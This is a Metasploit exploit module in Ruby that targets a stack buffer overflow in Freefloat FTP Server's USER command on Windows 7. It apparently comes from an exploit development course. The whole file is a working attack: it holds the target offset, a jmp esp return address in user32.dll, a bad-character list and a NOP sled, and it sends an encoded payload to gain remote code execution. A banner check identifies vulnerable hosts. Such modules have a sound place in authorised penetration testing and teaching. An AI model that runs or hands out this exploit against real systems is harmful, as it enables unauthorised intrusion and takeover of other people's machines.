##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'			 => 'Free Float FTP Server USER Command Buffer Overflow',
      'Description'	 => %q{
          Freefloat FTP Server is prone to an overflow condition. It
        fails to properly sanitize user-supplied input resulting in a
        stack-based buffer overflow. With a specially crafted 'USER'
        command, a remote attacker can potentially have an unspecified
        impact.
      },
      'Platform'		 => 'win',
      'Author'		 =>
        [
          'D35m0nd142', # Original exploit
          'Doug Prostko <dougtko[at]gmail.com>', # MSF module
	        'unyu hacker' #win7 Ultimate (For exploit devel POC course)
        ],
      'License'		 => MSF_LICENSE,
      'References'	 =>
        [
          [ 'OSVDB', '69621'],
          [ 'EDB', '23243']
        ],
      'Privileged'	 => false,
      'Payload'		 =>
        {
          'Space'          => 400,
          'BadChars'       => "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d",
        },
      'Targets'		=>
        [
          [ 'FreeFloat / Windows 7 Ultimate',
            {
              'Ret' => 0x76BC4E5B , # jmp esp; ret - user32.dll
              'Offset'   => 230
            }
          ],
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jun 12 2012'))
  end

  def check
    connect
    disconnect
    if (banner =~ /FreeFloat/)
      # Software is never updated, so if you run this you're f*cked.
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    connect
    buf = rand_text(target['Offset'])
    buf << [ target['Ret'] ].pack('V')
    buf << make_nops(50)
    buf << payload.encoded
    send_user(buf)
    disconnect
  end
end
